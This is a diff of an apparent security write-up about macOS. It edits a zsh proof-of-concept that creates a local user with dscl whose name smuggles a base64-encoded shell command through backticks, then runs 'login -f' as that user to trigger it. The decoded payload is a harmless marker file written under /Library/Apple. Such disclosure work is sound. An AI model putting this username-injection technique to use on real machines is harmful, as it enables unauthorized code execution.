@@ -152,16 +152,16 @@ Apparently, Claude was lying and it's quite easy to create weird user:
 
 ```shell
 #!/bin/zsh
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`'
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' UserShell /bin/zsh
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' RealName "UTM PWN"
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' UniqueID 1337
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' PrimaryGroupID 20
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' NFSHomeDirectory /Users/Leet
-dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' password123
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console'
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' UserShell /bin/zsh
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' RealName "UTM PWN"
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' UniqueID 1337
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' PrimaryGroupID 20
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' NFSHomeDirectory /Users/Leet
+dscl . -create /Users/'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' password123
 mkdir /Users/Leet
-chown 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`' /Users/Leet
-login -f 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK | base64 -d | sh`'
+chown 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console' /Users/Leet
+login -f 'console `echo ZWNobyBIZWxsbyA+IC9MaWJyYXJ5L0FwcGxlL3V0bXB3bl9uZXcK|base64 -d|sh` console'
 ```
 
 This simply works!  
